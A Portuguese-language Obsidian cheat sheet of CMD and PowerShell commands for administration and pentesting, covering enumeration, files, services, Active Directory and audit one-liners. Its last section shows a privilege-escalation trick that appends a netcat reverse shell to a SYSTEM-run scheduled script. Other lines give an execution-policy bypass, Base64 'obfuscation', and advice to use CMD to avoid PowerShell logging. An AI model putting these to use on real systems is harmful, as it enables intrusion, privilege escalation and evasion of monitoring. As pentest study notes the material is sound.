---
tags: [cheatsheet, windows, powershell, sysadmin, pentest]
cssclasses: [compact-tables]
aliases: [Windows Cheat Sheet]
---

# 🪟 PowerShell & CMD — Referência

> [!abstract] Como usar
> CMD legado = enum silenciosa (evita log do PS). PS = admin + auditoria.
> Base PT-BR em `CS / PS & CMD / CMD` e `PS`.

---

## 📟 1. CMD silencioso

### 🌐 Rede

| Comando | Para que serve |
|---|---|
| `ipconfig /all` | IP + MAC + DNS + DHCP |
| `netstat -ano` | Conexões + PID |
| `arp -a` | Tabela IP → MAC |
| `route print` | Rotas |
| `nbtstat -c` | Cache NetBIOS |

### 🖥️ Sistema

| Comando | Para que serve |
|---|---|
| `tasklist /v` | Processos verbose |
| `systeminfo` | Build + patches (busca CVE) |
| `whoami /all` | User + grupos + privs |
| `net localgroup administrators` | Quem é admin |
| `net user` | Usuários |

---

## 📁 2. Arquivos (PS)

| Ação | Comando |
|---|---|
| Ir / onde estou | `Set-Location C:\Logs` · `Get-Location` |
| Listar filtrado | `Get-ChildItem -Path C:\Logs -Filter *.log -Recurse` |
| Criar pasta | `New-Item -Path C:\Logs\app -ItemType Directory -Force` |
| Copiar / mover / apagar | `Copy-Item A B -Force` · `Move-Item A B` · `Remove-Item C:\Temp\* -Recurse -Force` |
| Ler | `Get-Content app.log` · `Get-Content app.log -Tail 50` |
| Escrever | `Set-Content f 'v'` (sobrescreve) · `Add-Content f 'entry'` (anexa) |
| Existe? / tamanho | `Test-Path f` · `(Get-Item f).Length` |
| Hash / zip | `Get-FileHash f -Algorithm SHA256` · `Compress-Archive -Path A -DestinationPath b.zip -Force` |

---

## ⚙️ 3. Serviços & Processos

| Ação | Comando |
|---|---|
| Serviços | `Get-Service` · `Start/Stop/Restart-Service W3SVC` |
| Auto-boot | `Set-Service W3SVC -StartupType Automatic` |
| Parados | `Get-Service \| Where-Object Status -ne Running` |
| Processos | `Get-Process` · `Stop-Process -Name notepad -Force` |
| Top CPU / RAM | `Get-Process \| Sort CPU -Desc \| Select -First 10` |
| Tasks | `Get-ScheduledTask \| Where State -eq Running` |

---

## 🌐 4. Rede & Remoto

| Ação | Comando |
|---|---|
| IP / placa / porta | `Get-NetIPAddress -AddressFamily IPv4` · `Get-NetAdapter \| Where Status -eq Up` · `Get-NetTCPConnection \| Where State -eq Listen` |
| Ping / porta / DNS | `Test-Connection server01 -Count 1` · `Test-NetConnection server01 -Port 443` · `Resolve-DnsName srv.contoso.com` |
| Web | `Invoke-WebRequest -Uri URL -Method GET` |
| Web quieto | `curl -I http://<IP>/path` · `curl -i -s -o NUL http://<IP>/path` |
| API | `Invoke-RestMethod -Uri URL -Method POST -Body ($b \| ConvertTo-Json) -ContentType 'application/json'` |
| Remoto | `Invoke-Command -ComputerName srv -ScriptBlock { Get-Service }` · `Enter-PSSession srv` · `New-PSSession srv` |

---

## 📊 5. Dados (JSON / CSV)

| Comando | Para que serve |
|---|---|
| `$o \| ConvertTo-Json -Depth 5` | Obj → JSON |
| `$j \| ConvertFrom-Json` | JSON → obj |
| `Import-Csv d.csv` / `Export-Csv o.csv -NoType` | CSV |

## 📝 6. Log no script

| Comando | Para que serve |
|---|---|
| `Write-Host / Verbose / Warning / Error` | Níveis de saída |
| `Add-Content log "$(Get-Date) - Entry"` | Log em arquivo |

---

## 🧑‍💼 7. Active Directory

| Ação | Comando |
|---|---|
| User | `Get-ADUser -Identity jsmith -Properties *` |
| Filtro | `Get-ADUser -Filter "Department -eq 'IT'"` |
| Cria / edita | `New-ADUser -Name 'Jane' -SamAccountName jdoe -Enabled $true` · `Set-ADUser jsmith -Title 'Sr'` |
| Trava | `Disable/Enable/Unlock-ADAccount jsmith` |
| Grupo | `Get-ADGroupMember 'IT-Admins'` · `Add-ADGroupMember 'IT-Admins' -Members jsmith` |

---

## 🔐 8. Segurança & Payload

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
Get-Acl 'C:\SensitiveData' | Select -Expand Access

# Base64 (ofuscação / transporte)
$enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('Payload'))
$dec = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($enc))
```

---

## ⚡ 9. One-liners de auditoria

```powershell
# Arquivos grandes
Get-ChildItem C:\ -Recurse -File -EA SilentlyContinue | Sort Length -Desc | Select -First 20 FullName,@{N='MB';E={[math]::Round($_.Length/1MB,2)}}
# Admins locais
Get-LocalGroupMember -Group Administrators
# Firewall inbound
Get-NetFirewallRule -Enabled True -Direction Inbound | Get-NetFirewallPortFilter | Select Protocol,LocalPort
# Serviços rodando → CSV
Get-Service | Where Status -eq Running | Export-Csv C:\Reports\svc.csv -NoType
# Modificados 24h
Get-ChildItem C:\Logs -Recurse -File | Where LastWriteTime -gt (Get-Date).AddHours(-24) | Select Name,LastWriteTime
# Versão
$PSVersionTable.PSVersion; (Get-CimInstance Win32_OperatingSystem).Caption
```

> [!tip] Moderno vs legado
> Use `Get-CimInstance` (não `Get-WmiObject`), nome completo do cmdlet em script, `-WhatIf` para testar.

## 💥 11. Privesc task hijack

> [!danger] Resumo — detalhe em `CJCA §13`
> Script com escrita + roda como SYSTEM = injete e espere o gatilho.

```powershell
echo "C:\Temp\nc.exe <IP> 4444 -e cmd.exe" >> C:\ProgramData\Corp\backupprep.ps1
# Kali: nc -lvnp 4444  (bin em /usr/share/windows-resources/binaries/)
```
